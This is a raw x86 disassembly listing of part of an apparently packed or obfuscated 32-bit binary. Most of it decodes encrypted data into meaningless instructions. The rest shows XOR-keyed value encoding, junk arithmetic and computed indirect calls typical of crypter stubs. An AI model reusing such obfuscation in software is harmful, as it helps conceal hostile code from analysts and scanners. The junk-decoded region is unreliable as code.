  41378f:	scas   eax,DWORD PTR es:[edi]
  413790:	fwait
  413791:	daa    
  413792:	jae    0x4137c6
  413794:	push   esp
  413795:	(bad)  
  413796:	adc    DWORD PTR [esi-0x32],ebx
  413799:	call   0xa172:0x433cff34
  4137a0:	xlat   BYTE PTR ds:[ebx]
  4137a1:	sub    bl,dl
  4137a3:	leave  
  4137a4:	dec    edx
  4137a5:	pushf  
  4137a6:	int3   
  4137a7:	mov    ebx,0x2f4fc010
  4137ac:	call   0x5785f2d
  4137b1:	(bad)  
  4137b2:	loope  0x413763
  4137b4:	into   
  4137b5:	stos   BYTE PTR es:[edi],al
  4137b6:	mov    DWORD PTR [edx+ebp*4],ebx
  4137b9:	sub    eax,0xb7fea949
  4137be:	pop    ds
  4137bf:	std    
  4137c0:	push   0xc9da36f1
  4137c5:	push   ecx
  4137c6:	mul    bl
  4137c8:	popa   
  4137c9:	mov    ecx,0xf09bc0a8
  4137ce:	lods   al,BYTE PTR ds:[esi]
  4137cf:	mov    bl,0x76
  4137d2:	push   eax
  4137d3:	sti    
  4137d4:	imul   ebx,esi,0x6f
  4137d7:	cdq    
  4137d8:	mov    ecx,0xe8078d91
  4137dd:	xchg   al,ah
  4137df:	shr    DWORD PTR [esi-0x5b],0xe6
  4137e3:	cmc    
  4137e4:	ficomp WORD PTR [edi-0x4bb277ee]
  4137ea:	retf   
  4137eb:	hlt    
  4137ec:	sub    esp,eax
  4137ee:	lahf   
  4137ef:	stc    
  4137f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137f1:	pop    ecx
  4137f2:	cs or  al,0x1b
  4137f5:	sbb    DWORD PTR [edi],0xfeb5b503
  4137fb:	jle    0x41385e
  4137fd:	test   bl,ah
  4137ff:	mov    dl,0xf8
  413801:	xchg   ebx,eax
  413802:	pop    esp
  413803:	mov    esi,0x1e5dbe0d
  413808:	mov    WORD PTR [eax+0x5c926064],cs
  41380e:	ds mov ah,0xb
  413811:	loop   0x4137a1
  413813:	call   DWORD PTR [ebx]
  413815:	mov    DWORD PTR [ebp+0x61],edx
  413818:	mov    ecx,0x53bbfe44
  41381d:	mov    edi,0x529167fa
  413822:	call   0x1114f058
  413827:	xchg   ecx,eax
  413828:	(bad)  
  41382a:	add    BYTE PTR [edx],bl
  41382c:	std    
  41382d:	or     al,0xba
  41382f:	dec    edx
  413830:	xor    DWORD PTR [ebp-0x5a],esi
  413833:	daa    
  413834:	xchg   BYTE PTR [eax-0xf],ch
  413837:	dec    ebp
  413838:	push   eax
  413839:	lods   eax,DWORD PTR ds:[esi]
  41383a:	jnp    0x413820
  41383c:	xor    DWORD PTR [eax-0x151425c1],esp
  413842:	(bad)  
  413844:	(bad)  
  413845:	jo     0x41383e
  413847:	mov    fs,WORD PTR [ebp-0x45828c86]
  41384d:	add    DWORD PTR ds:0xd8b3bd43,ecx
  413853:	aam    0x3e
  413855:	pop    ebx
  413856:	fcomi  st,st(7)
  413858:	xlat   BYTE PTR ds:[ebx]
  413859:	test   BYTE PTR [ebp+0x124a7f19],bh
  41385f:	push   edx
  413860:	push   ss
  413861:	mov    al,ds:0x35cd7c72
  413866:	call   0x52349ea8
  41386b:	popf   
  41386c:	shr    BYTE PTR [edx-0x3f630b3f],0xf4
  413873:	mov    esp,0x5174bd89
  413878:	inc    ebx
  413879:	and    al,0x26
  41387b:	mov    esi,0x3d5bf474
  413880:	mov    esi,0xbf91f2af
  413885:	adc    ebx,edx
  413887:	das    
  413888:	xor    esi,DWORD PTR [edi-0x3012d9d7]
  41388e:	jp     0x4138aa
  413890:	outs   dx,BYTE PTR ds:[esi]
  413891:	jmp    0xf0052767
  413896:	inc    ebx
  413897:	mov    DWORD PTR [ebx],esp
  413899:	into   
  41389a:	and    eax,0xb426fab2
  41389f:	test   BYTE PTR [eax+edi*8+0x55b72432],ch
  4138a6:	loopne 0x4138cb
  4138a8:	pop    esi
  4138a9:	xchg   DWORD PTR [edi+0x3c084f6d],ecx
  4138af:	add    BYTE PTR [edi],ah
  4138b1:	jge    0x4138c5
  4138b3:	pusha  
  4138b4:	sbb    esp,edx
  4138b6:	cmp    edx,DWORD PTR [edi-0x68351d4b]
  4138bc:	loop   0x41384b
  4138be:	int    0xfa
  4138c0:	ja     0x4138b7
  4138c2:	add    edi,DWORD PTR [ebx]
  4138c4:	pop    DWORD PTR [esi+0x3]
  4138c7:	rcr    BYTE PTR [esi+ebp*1+0x684bac0d],1
  4138ce:	lea    ebp,[ecx+0x7036093c]
  4138d4:	ins    BYTE PTR es:[edi],dx
  4138d5:	(bad)  
  4138d7:	xchg   esi,eax
  4138d8:	sub    eax,0xc5b1f042
  4138dd:	daa    
  4138de:	fidiv  DWORD PTR [ebx+esi*2+0x9186de8]
  4138e5:	sar    BYTE PTR [ecx+0x1d571ac0],1
  4138eb:	add    DWORD PTR [ebp+0x132251e4],ecx
  4138f1:	sub    BYTE PTR [ecx+0x1e],cl
  4138f4:	in     eax,dx
  4138f5:	aas    
  4138f6:	add    DWORD PTR [ebx+0x2],0xffffffc3
  4138fa:	lahf   
  4138fb:	xor    ebp,DWORD PTR [ebp-0x234dafc2]
  413901:	push   ebx
  413902:	add    BYTE PTR [eax],dh
  413904:	out    0x7c,eax
  413906:	ins    BYTE PTR es:[edi],dx
  413907:	cmp    dl,dh
  413909:	adc    al,0xd7
  41390b:	scas   al,BYTE PTR es:[edi]
  41390c:	jns    0x41391c
  41390e:	mov    al,ds:0x36a773b1
  413913:	xor    ebp,DWORD PTR [esi-0x36]
  413916:	rcl    DWORD PTR [eax+0x74],1
  413919:	or     ebx,DWORD PTR [ebx+0x79aed778]
  41391f:	pop    ds
  413920:	push   eax
  413921:	ret    
  413922:	jecxz  0x413951
  413924:	dec    ecx
  413925:	mov    WORD PTR [edx],es
  413927:	adc    eax,0x20b006d8
  41392c:	or     al,0x49
  41392e:	das    
  41392f:	aaa    
  413930:	lods   eax,DWORD PTR ds:[esi]
  413931:	push   0x5b
  413933:	into   
  413934:	dec    eax
  413935:	fild   WORD PTR [eax-0x6e41433e]
  41393b:	pushf  
  41393c:	dec    esi
  41393d:	add    al,0x4b
  41393f:	xchg   ebp,eax
  413940:	dec    edi
  413941:	jmp    0x4138ca
  413943:	jg     0x41398f
  413945:	cmp    eax,0x811d94f9
  41394a:	push   cs
  41394b:	adc    eax,0x76ea537a
  413950:	cwde   
  413951:	lods   eax,DWORD PTR ds:[esi]
  413952:	stos   BYTE PTR es:[edi],al
  413953:	repz out dx,eax
  413955:	mov    edi,0xc8f59b1e
  41395a:	xchg   esi,eax
  41395b:	and    ebx,ebx
  41395d:	lahf   
  41395e:	push   edi
  41395f:	mov    dl,al
  413961:	xchg   ecx,eax
  413962:	mov    edi,0x262e7892
  413967:	dec    ecx
  413968:	inc    ecx
  413969:	fld    DWORD PTR [esp+ebp*2]
  41396c:	inc    edx
  41396d:	test   ebp,edi
  41396f:	test   eax,0xc816375c
  413974:	ret    0xf1c1
  413977:	loope  0x41392e
  413979:	pop    esi
  41397a:	cmp    al,0xe6
  41397c:	pop    ebx
  41397d:	and    ebp,DWORD PTR gs:[ecx+0x416f84df]
  413984:	icebp  
  413985:	imul   esp,DWORD PTR [ecx-0x2fef6f5d],0xc540d3b4
  41398f:	test   eax,0x2594a30a
  413994:	loopne 0x4139e2
  413996:	mov    ecx,0x30ebe63c
  41399b:	sub    eax,0x562d0363
  4139a0:	sub    dh,BYTE PTR [edx]
  4139a2:	mov    eax,0x4efa497e
  4139a7:	(bad)  
  4139a9:	cmp    al,BYTE PTR [edi+0x77]
  4139ac:	sub    BYTE PTR ds:0x9547efd,dh
  4139b2:	call   0xe9b02498
  4139b7:	jmp    FWORD PTR [ebx]
  4139b9:	mov    ds:0xdf049e71,eax
  4139be:	ffree  st(7)
  4139c0:	sar    BYTE PTR [edi],cl
  4139c2:	sbb    eax,0x13be919a
  4139c7:	es xchg ecx,eax
  4139c9:	bound  ebp,QWORD PTR [edi-0x6d]
  4139cc:	mov    DWORD PTR [eax+eax*2+0x586a5be3],esi
  4139d3:	cmp    DWORD PTR [esi+0x70],ecx
  4139d6:	sbb    dl,BYTE PTR [edi+0x6b]
  4139d9:	(bad)  
  4139da:	gs ins BYTE PTR es:[edi],dx
  4139dc:	sub    dh,cl
  4139de:	mov    dl,0x8b
  4139e0:	hlt    
  4139e1:	fistp  WORD PTR [esi]
  4139e3:	(bad)  
  4139e4:	xor    eax,0x1db7634b
  4139e9:	shl    DWORD PTR ds:0x17026b00,cl
  4139ef:	in     eax,dx
  4139f0:	xchg   edx,eax
  4139f1:	fisttp DWORD PTR [ebp-0x6967b099]
  4139f7:	sbb    ch,bl
  4139f9:	adc    esp,DWORD PTR [ecx]
  4139fb:	out    dx,al
  4139fc:	test   BYTE PTR [ecx],bl
  4139fe:	(bad)  
  4139ff:	xor    ebp,eax
  413a01:	outs   dx,BYTE PTR ds:[esi]
  413a02:	sar    esp,1
  413a04:	aas    
  413a05:	loopne 0x4139aa
  413a07:	mov    ebx,0x94cbc6c5
  413a0c:	enter  0x1999,0x88
  413a10:	enter  0x5a94,0x5c
  413a14:	jne    0x413a60
  413a16:	xor    eax,0xe65bdea4
  413a1b:	jmp    0x4139e7
  413a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a1e:	push   esp
  413a1f:	add    bh,dl
  413a21:	mov    ds:0x879a2c,eax
  413a26:	mov    edi,0xe8744d06
  413a2b:	in     al,0x97
  413a2d:	push   eax
  413a2e:	imul   DWORD PTR [edi]
  413a30:	xor    esp,DWORD PTR [ebx+0x3bc38db1]
  413a36:	ins    BYTE PTR es:[edi],dx
  413a37:	add    eax,0xa085340e
  413a3c:	mov    ah,0x7e
  413a3e:	ja     0x413a72
  413a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a41:	fidiv  DWORD PTR [edi]
  413a43:	fadd   DWORD PTR [ebx+0x66]
  413a46:	fdiv   DWORD PTR ds:0x2b70274c
  413a4c:	les    esi,FWORD PTR [edx]
  413a4e:	aam    0xf9
  413a50:	push   ds
  413a51:	ins    DWORD PTR es:[edi],dx
  413a52:	push   edi
  413a53:	fldenv [ebp+0x78bbc889]
  413a59:	adc    dl,BYTE PTR [edi-0x5b551e9d]
  413a5f:	add    ah,BYTE PTR ds:0xaad71698
  413a65:	or     ch,BYTE PTR [esi]
  413a67:	adc    DWORD PTR ds:0xf544e579,esi
  413a6d:	sbb    eax,0x21fa8c39
  413a72:	cmp    al,0x16
  413a74:	push   ds
  413a75:	cmp    edx,DWORD PTR [ecx-0x66388cef]
  413a7b:	jnp    0x413af5
  413a7d:	xor    BYTE PTR [esp+ebx*4-0x14],bl
  413a81:	mov    eax,ds:0x4cfa2267
  413a86:	retf   
  413a87:	sbb    al,0x2f
  413a89:	cmp    BYTE PTR [ecx+0x68],cl
  413a8c:	aad    0x11
  413a8e:	fs push edi
  413a90:	stos   BYTE PTR es:[edi],al
  413a91:	add    bh,cl
  413a93:	inc    esp
  413a94:	dec    ebp
  413a95:	and    ebx,DWORD PTR [ecx]
  413a97:	pop    es
  413a98:	cli    
  413a99:	es jae 0x413ad2
  413a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9d:	pop    esp
  413a9e:	loope  0x413aeb
  413aa0:	ins    DWORD PTR es:[edi],dx
  413aa1:	adc    cl,BYTE PTR [eax-0xc]
  413aa4:	jge    0x413a69
  413aa6:	xor    ecx,DWORD PTR [edx*2+0x5566a08a]
  413aad:	pop    esi
  413aae:	sub    eax,0xf1d9cf46
  413ab3:	add    BYTE PTR [eax],ah
  413ab5:	punpcklbw mm4,mm1
  413ab8:	mov    bh,0xd1
  413aba:	jl     0x413b38
  413abc:	fcmovu st,st(0)
  413abe:	sub    al,0xae
  413ac0:	jae    0x413a94
  413ac2:	mov    BYTE PTR [eax+0x65],dl
  413ac5:	popa   
  413ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac7:	pop    esp
  413ac8:	jae    0x413a54
  413aca:	repz fsub DWORD PTR [ecx+0x696c27ca]
  413ad1:	cs aas 
  413ad3:	pop    esp
  413ad4:	lods   al,BYTE PTR ds:[esi]
  413ad5:	sahf   
  413ad6:	scas   al,BYTE PTR es:[edi]
  413ad7:	push   esi
  413ad8:	jmp    0xa8b7:0x47ef82bd
  413adf:	gs mov edi,0xa51b0395
  413ae5:	mov    ebp,eax
  413ae7:	test   eax,0xc1b87d64
  413aec:	cmp    al,0xfc
  413aee:	stos   DWORD PTR es:[edi],eax
  413aef:	jo     0x413aae
  413af1:	dec    edi
  413af2:	daa    
  413af3:	fwait
  413af4:	pop    edi
  413af5:	jo     0x413b44
  413af7:	sub    eax,0x74ac4c2b
  413afd:	imul   esi,DWORD PTR gs:[ebp+ebx*8-0x70],0x58
  413b03:	inc    esp
  413b04:	jecxz  0x413ab3
  413b06:	or     edi,eax
  413b08:	pop    ebx
  413b09:	popf   
  413b0a:	loop   0x413b35
  413b0c:	dec    BYTE PTR [ebx+0x50fcc6e7]
  413b12:	add    esp,DWORD PTR [ebp+0x4487741]
  413b18:	push   ebx
  413b19:	jae    0x413add
  413b1b:	sub    BYTE PTR [edx-0x6c2a4004],cl
  413b21:	push   eax
  413b22:	and    ah,al
  413b24:	push   eax
  413b25:	xor    al,0xcd
  413b27:	lock sti 
  413b29:	repnz not BYTE PTR fs:[ebx]
  413b2d:	cmp    BYTE PTR [edx+esi*1],ah
  413b30:	mov    dl,BYTE PTR [edx]
  413b32:	sub    ebx,esp
  413b34:	or     ebp,0xf73c3923
  413b3a:	inc    edi
  413b3b:	call   0x2230:0xaa268000
  413b42:	inc    ebp
  413b43:	or     al,0x6
  413b45:	jg     0x413afa
  413b47:	shr    DWORD PTR [ecx+edi*2],0x83
  413b4b:	mov    dh,0x5d
  413b4d:	lods   al,BYTE PTR ds:[esi]
  413b4e:	fidiv  DWORD PTR [esp+ebp*2]
  413b51:	lea    ecx,[ecx]
  413b53:	mov    bl,ch
  413b55:	jmp    0xf323b28f
  413b5a:	jg     0x413b92
  413b5c:	jg     0x413bd0
  413b5e:	xchg   esi,eax
  413b5f:	xor    eax,0xd400607b
  413b64:	gs dec ebp
  413b66:	popa   
  413b67:	iret   
  413b68:	retf   
  413b69:	cli    
  413b6a:	inc    eax
  413b6b:	push   ecx
  413b6c:	cmp    ebp,0xfffffffd
  413b6f:	mov    bl,0xc1
  413b71:	inc    esp
  413b72:	and    eax,0x8fe2dc12
  413b77:	mov    ecx,0x1fb4829
  413b7c:	ret    0x6a24
  413b7f:	loope  0x413b13
  413b81:	jmp    0x3be15d14
  413b86:	sbb    ch,BYTE PTR [eax]
  413b88:	cmc    
  413b89:	repnz xor al,0x5c
  413b8c:	adc    BYTE PTR [ebx],ch
  413b8e:	in     eax,0x63
  413b90:	add    eax,0x2a25803a
  413b95:	aad    0x12
  413b97:	or     eax,DWORD PTR [eax]
  413b99:	dec    esi
  413b9a:	imul   ebp,DWORD PTR [edi-0x2c6813e6],0x4f0f1847
  413ba4:	out    0xb5,eax
  413ba6:	pushf  
  413ba7:	bound  edi,QWORD PTR [ebx+0x7c]
  413baa:	arpl   bp,dx
  413bac:	inc    ebp
  413bad:	(bad)  
  413bae:	mov    al,ds:0xdd2b71ed
  413bb3:	daa    
  413bb4:	or     al,0x50
  413bb6:	retf   0x373
  413bb9:	pop    eax
  413bba:	adc    BYTE PTR [esi-0x8],ah
  413bbd:	repz inc esi
  413bbf:	pusha  
  413bc0:	mov    ebp,0xac3a8b5b
  413bc5:	jns    0x413ba0
  413bc7:	mov    ah,0x5c
  413bc9:	mov    DWORD PTR [edx+0x33b451a5],eax
  413bcf:	test   DWORD PTR [esi-0x26],ebp
  413bd2:	pop    esi
  413bd3:	cmc    
  413bd4:	rcr    BYTE PTR [edi-0x17],cl
  413bd7:	cmc    
  413bd8:	xchg   esp,eax
  413bd9:	ret    
  413bda:	cmp    ch,BYTE PTR [ecx+ecx*4-0x64efedc4]
  413be1:	ror    al,1
  413be3:	mov    DWORD PTR [edi-0x1a],ecx
  413be6:	fld    TBYTE PTR [esi-0xf770458]
  413bec:	out    0xa4,al
  413bee:	adc    esi,DWORD PTR [ebx]
  413bf0:	ret    
  413bf1:	jle    0x413b9b
  413bf3:	rol    BYTE PTR [esi],1
  413bf5:	pop    edx
  413bf6:	xchg   ecx,eax
  413bf7:	enter  0x7593,0x82
  413bfb:	xchg   ecx,eax
  413bfc:	jo     0x413ba1
  413bfe:	pop    ebp
  413bff:	xor    DWORD PTR [eax],ebp
  413c01:	repz das 
  413c03:	adc    DWORD PTR ds:0x9ae626b3,esi
  413c09:	sti    
  413c0a:	mov    bl,0x97
  413c0c:	gs pop esi
  413c0e:	or     DWORD PTR [ebx+0x63],edi
  413c11:	lahf   
  413c12:	call   0x3bbc9ebb
  413c17:	inc    ebp
  413c18:	in     eax,0x54
  413c1a:	adc    eax,0x6c95692b
  413c1f:	mov    bl,0xb
  413c21:	xchg   eax,esi
  413c23:	adc    dl,BYTE PTR [ebp-0x7a2998b8]
  413c29:	mov    bl,0x95
  413c2b:	adc    ebp,DWORD PTR [ecx]
  413c2d:	and    al,0xaa
  413c2f:	dec    edx
  413c30:	(bad)  
  413c31:	xlat   BYTE PTR ds:[ebx]
  413c32:	lock sbb al,BYTE PTR [esi+0x643d5c74]
  413c39:	push   edx
  413c3a:	loope  0x413c73
  413c3c:	xor    bl,BYTE PTR [ecx+eiz*4-0x28fe172c]
  413c43:	sbb    edx,DWORD PTR [ebx+ebx*2+0x7a]
  413c47:	stos   BYTE PTR es:[edi],al
  413c48:	sub    cl,BYTE PTR [ebp+0x3b]
  413c4b:	sbb    al,0x2e
  413c4d:	inc    eax
  413c4e:	inc    esi
  413c4f:	jmp    0x224cc73f
  413c54:	push   eax
  413c55:	mov    bh,0xc3
  413c57:	mov    bl,BYTE PTR [ecx+edi*2+0x16]
  413c5b:	mov    edx,0xa8c909a0
  413c60:	xchg   DWORD PTR [ecx],ecx
  413c62:	push   ebx
  413c64:	js     0x413c78
  413c66:	dec    ecx
  413c67:	cmp    esi,ebx
  413c69:	jg     0x413bf6
  413c6b:	jge    0x413c8c
  413c6d:	retf   0x82a6
  413c70:	shr    BYTE PTR [eax-0x6f],0x6d
  413c74:	ja     0x413ce6
  413c76:	in     eax,dx
  413c77:	rcl    edx,0xfc
  413c7a:	xchg   BYTE PTR [eax],bh
  413c7c:	ss pop esp
  413c7e:	or     BYTE PTR [edi+edx*1-0x36341e1],al
  413c85:	dec    ebx
  413c86:	dec    edi
  413c87:	data16 add al,0x73
  413c8a:	adc    eax,0xde856224
  413c8f:	inc    esi
  413c90:	mov    esp,0xa478f8ff
  413c95:	imul   esp,ecx,0x9235f831
  413c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c9c:	sub    eax,0x98988418
  413ca1:	jnp    0x413c81
  413ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ca4:	jb     0x413c4d
  413ca6:	jmp    0xf81e:0x7acc808b
  413cad:	xchg   DWORD PTR ds:0xab2ee0f9,esp
  413cb3:	(bad)  
  413cb4:	enter  0x97a1,0xea
  413cb8:	xor    BYTE PTR [edx-0x5d],ch
  413cbb:	(bad)  
  413cbd:	(bad)
  413cc0:	and    bl,BYTE PTR [ebp+0x231b0e09]
  413cc6:	mov    ds:0x5101dc26,eax
  413ccb:	xchg   BYTE PTR ds:0xbcd8622b,cl
  413cd1:	ret    
  413cd2:	clc    
  413cd3:	lock add ch,bl
  413cd6:	into   
  413cd7:	repnz dec esi
  413cd9:	retf   
  413cda:	cmp    al,0x9a
  413cdc:	sbb    eax,0x3ff31dd1
  413ce1:	js     0x413c8e
  413ce3:	inc    edi
  413ce4:	aam    0xa9
  413ce6:	loop   0x413cff
  413ce8:	out    dx,eax
  413ce9:	push   0x91872b07
  413cee:	call   0xe696c227
  413cf3:	ror    BYTE PTR [ebx-0x42],1
  413cf6:	adc    eax,0xffffff99
  413cf9:	js     0x413d5e
  413cfb:	push   cs
  413cfc:	sub    al,0x24
  413cfe:	mov    ecx,DWORD PTR [ebp-0x14]
  413d01:	mov    eax,DWORD PTR [ecx+eax*4]
  413d04:	mov    DWORD PTR [ebp-0x38],eax
  413d07:	jmp    0x40f5ba
  413d0c:	mov    eax,DWORD PTR [ebp-0xc]
  413d0f:	xor    eax,esi
  413d11:	lea    ebx,[ebx+eax*1+0x3272f1]
  413d18:	jmp    0x40ac84
  413d1d:	mov    eax,DWORD PTR [ebp-0x4]
  413d20:	xor    eax,esi
  413d22:	add    eax,edi
  413d24:	jmp    0x413e48
  413d29:	mov    eax,DWORD PTR [ebp-0x38]
  413d2c:	add    eax,DWORD PTR [ebp+0x8]
  413d2f:	mov    DWORD PTR [ebp-0x18],eax
  413d32:	mov    eax,DWORD PTR [ebp-0x1c]
  413d35:	test   eax,eax
  413d37:	je     0x413dd1
  413d3d:	mov    DWORD PTR [ebp-0x20],0x0
  413d44:	push   0x3
  413d46:	xor    edx,edx
  413d48:	pop    edx
  413d49:	add    edx,0x8
  413d4c:	push   edx
  413d4d:	pop    ecx
  413d4e:	push   0x6
  413d50:	dec    ecx
  413d51:	pop    ebx
  413d52:	dec    ebx
  413d53:	xchg   ebx,ecx
  413d55:	sub    ebx,ecx
  413d57:	xchg   ebx,ecx
  413d59:	dec    ecx
  413d5a:	mov    eax,DWORD PTR [ebp-0x1c]
  413d5d:	imul   eax,ecx
  413d60:	sub    esp,eax
  413d62:	mov    DWORD PTR [ebp-0x20],esp
  413d65:	mov    eax,DWORD PTR [ebp-0x4]
  413d68:	xor    eax,esi
  413d6a:	add    eax,edi
  413d6c:	jmp    0x413daa
  413d71:	mov    ecx,DWORD PTR [ebp-0xc]
  413d74:	mov    eax,DWORD PTR [ebp+0x8]
  413d77:	mov    edx,DWORD PTR [ebp+0x14]
  413d7a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  413d7e:	xor    ecx,esi
  413d80:	add    ecx,edi
  413d82:	xor    edx,edx
  413d84:	div    ecx
  413d86:	mov    ecx,DWORD PTR [ebp-0x4]
  413d89:	xor    ecx,esi
  413d8b:	lea    eax,[ecx+eax*1+0x3272f1]
  413d92:	mov    ecx,DWORD PTR [ebp+0x8]
  413d95:	mov    edx,DWORD PTR [ebp-0x20]
  413d98:	mov    DWORD PTR [edx+ecx*4],eax
  413d9b:	mov    eax,DWORD PTR [ebp-0xc]
  413d9e:	mov    ecx,DWORD PTR [ebp+0x8]
  413da1:	xor    eax,esi
  413da3:	lea    eax,[eax+ecx*1+0x3272f1]
  413daa:	mov    DWORD PTR [ebp+0x8],eax
  413dad:	mov    eax,DWORD PTR [ebp-0xc]
  413db0:	mov    ecx,DWORD PTR [ebp+0x14]
  413db3:	xor    eax,esi
  413db5:	add    eax,edi
  413db7:	imul   eax,DWORD PTR [ecx]
  413dba:	mov    ecx,DWORD PTR [ebp-0x4]
  413dbd:	mov    edx,DWORD PTR [ebp+0x8]
  413dc0:	xor    ecx,esi
  413dc2:	lea    ecx,[ecx+edx*1+0x3272f1]
  413dc9:	cmp    ecx,eax
  413dcb:	jne    0x413d71
  413dd1:	mov    eax,DWORD PTR [ebp-0x4]
  413dd4:	xor    eax,esi
  413dd6:	add    eax,edi
  413dd8:	mov    DWORD PTR [ebp-0x10],eax
  413ddb:	mov    ebx,0x65655
  413de0:	add    ebx,0x3234
  413de6:	xchg   ebx,esi
  413de8:	xor    ebx,ebx
  413dea:	push   esi
  413deb:	mov    esi,ebx
  413ded:	pop    ebx
  413dee:	mov    edx,esi
  413df0:	add    ebx,0x1002
  413df6:	lea    eax,[ebp-0x18]
  413df9:	add    edx,eax
  413dfb:	add    edx,0x5
  413dfe:	push   edx
  413dff:	inc    esi
  413e00:	pop    ecx
  413e01:	dec    ecx
  413e02:	xchg   ecx,eax
  413e03:	dec    eax
  413e04:	xchg   ecx,eax
  413e05:	dec    ecx
  413e06:	xchg   ecx,edx
  413e08:	dec    edx
  413e09:	push   edx
  413e0a:	mov    edx,ebx
  413e0c:	pop    ebx
  413e0d:	dec    ebx
  413e0e:	call   DWORD PTR [ebx]
  413e10:	cmp    DWORD PTR [ebp+0x10],esi
  413e13:	je     0x413e34
  413e19:	xchg   edx,eax
  413e1a:	push   0xc
  413e1c:	pop    ecx
  413e1d:	dec    ecx
  413e1e:	push   0x3
  413e20:	pop    ebx
  413e21:	inc    ebx
  413e22:	xchg   ebx,ecx
  413e24:	inc    ecx
  413e25:	sub    ebx,ecx
  413e27:	xchg   ebx,ecx
  413e29:	dec    ecx
  413e2a:	dec    ecx
  413e2b:	mov    eax,DWORD PTR [ebp-0x1c]
  413e2e:	imul   eax,ecx
  413e31:	add    esp,eax
  413e33:	xchg   edx,eax
  413e34:	push   eax
  413e35:	xor    ebx,ebx
  413e37:	mov    edx,esp
  413e39:	dec    edx
  413e3a:	inc    ebx
  413e3b:	add    ebx,DWORD PTR [edx+ebx*1]
  413e3e:	dec    ebx
  413e3f:	xor    edx,edx
  413e41:	add    DWORD PTR [ebp-0x10],ebx
  413e44:	pop    ebx
  413e45:	mov    eax,DWORD PTR [ebp-0x10]
  413e48:	pop    edi
  413e49:	pop    esi
  413e4a:	pop    ebx
  413e4b:	leave  
  413e4c:	ret    0x10
  413e4f:	push   ebp
  413e50:	mov    ebp,esp
  413e52:	push   ecx
  413e53:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413e5a:	sub    ecx,edx
  413e5c:	mov    eax,DWORD PTR [ebp-0x4]
  413e5f:	mov    edx,DWORD PTR [ebp+0x10]
  413e62:	adc    DWORD PTR ds:0x42a2aa,ecx
  413e68:	mov    ecx,0x75108aa
  413e6d:	xor    eax,ecx
  413e6f:	sub    DWORD PTR ds:0x42a2d2,0x42a2ee
  413e79:	add    eax,0x3272f1
  413e7e:	mov    DWORD PTR [edx],eax
  413e80:	movzx  eax,BYTE PTR ds:0x42a2b6
  413e87:	sub    eax,DWORD PTR ds:0x42a2b2
  413e8d:	mov    ds:0x42a2b6,eax
  413e92:	mov    eax,DWORD PTR [ebp+0xc]
  413e95:	xor    eax,ecx
  413e97:	push   esi
  413e98:	mov    esi,DWORD PTR [ebp+0x10]
  413e9b:	and    DWORD PTR ds:0x42a2ae,0x0
  413ea5:	jmp    0x413eb7
  413eaa:	mov    edx,DWORD PTR ds:0x42a2ae
  413eb0:	inc    edx
  413eb1:	mov    DWORD PTR ds:0x42a2ae,edx
  413eb7:	cmp    DWORD PTR ds:0x42a2ae,0x15
  413ebe:	jae    0x413eee
  413ec4:	cmp    DWORD PTR ds:0x42a2ae,0x1b
  413ecb:	jl     0x413eee
  413ed1:	jmp    0x413ee9
  413ed6:	push   0x4a7a
  413edb:	push   0x52a4
  413ee0:	push   DWORD PTR [ebp-0x20]
  413ee3:	call   DWORD PTR ds:0x42a412
  413ee9:	jmp    0x413eaa
  413eee:	mov    edx,0x3272f1
  413ef3:	add    eax,edx
  413ef5:	mov    DWORD PTR [esi+0x4],eax
  413ef8:	mov    eax,DWORD PTR [ebp+0x14]
  413efb:	mov    esi,DWORD PTR [ebp+0x10]
  413efe:	mov    DWORD PTR [esi+0x8],eax
  413f01:	mov    eax,DWORD PTR [ebp+0x18]
  413f04:	mov    esi,DWORD PTR [ebp+0x10]
  413f07:	mov    DWORD PTR [esi+0xc],eax
  413f0a:	mov    eax,DWORD PTR [ebp+0x1c]
  413f0d:	mov    esi,DWORD PTR [ebp+0x10]
  413f10:	mov    DWORD PTR [esi+0x10],eax
  413f13:	mov    eax,DWORD PTR [ebp+0x8]
  413f16:	xor    eax,ecx
  413f18:	add    eax,edx
  413f1a:	pop    esi
  413f1b:	leave  
  413f1c:	ret    0x18
  413f1f:	push   ebp
  413f20:	mov    ebp,esp
  413f22:	sub    esp,0x9c
  413f28:	mov    ecx,DWORD PTR [ebp+0x8]
  413f2b:	add    DWORD PTR ds:0x42a2be,ecx
  413f31:	mov    eax,0x8a98
  413f36:	adc    DWORD PTR ds:0x42a2de,0x457a
  413f40:	xor    ax,WORD PTR [ecx+0x20]
  413f44:	mov    ecx,0x3b5a
  413f49:	adc    DWORD PTR ds:0x42a296,0x42a262
  413f53:	add    ax,cx
  413f56:	movzx  eax,ax
  413f59:	sub    ecx,DWORD PTR ds:0x42a276
  413f5f:	mov    DWORD PTR [ebp-0x10],eax
  413f62:	mov    BYTE PTR [ebp-0x1],0x7c
  413f66:	sbb    ecx,DWORD PTR ds:0x42a28e
  413f6c:	lea    eax,[ebp-0x1]
  413f6f:	mov    DWORD PTR [ebp-0xc],eax
  413f72:	mov    al,BYTE PTR [ebp-0x1]
  413f75:	sbb    DWORD PTR ds:0x42a276,0x42a2a6
  413f7f:	mov    ecx,DWORD PTR [ebp-0xc]
  413f82:	xor    al,0x7c
  413f84:	xor    DWORD PTR ds:0x42a27e,0x42a2d2
  413f8e:	inc    al
  413f90:	and    DWORD PTR ds:0x42a262,0x42a2fa
  413f9a:	mov    BYTE PTR [ecx],al
  413f9c:	add    eax,ecx
  413f9e:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  413fa5:	add    DWORD PTR ds:0x42a272,0x42a28e
  413faf:	push   ebx
  413fb0:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  413fb7:	mov    ecx,DWORD PTR [ebp-0x18]
  413fba:	push   esi
  413fbb:	mov    esi,DWORD PTR ds:0x42a346
  413fc1:	mov    eax,ds:0x42a372
  413fc6:	sub    eax,esi
  413fc8:	or     esi,DWORD PTR [esi+eax*1]
  413fcb:	mov    eax,0x75108aa
  413fd0:	sub    esi,DWORD PTR ds:0x42a2a6
  413fd6:	xor    ecx,eax
  413fd8:	mov    esi,0x3272f1
  413fdd:	push   edi
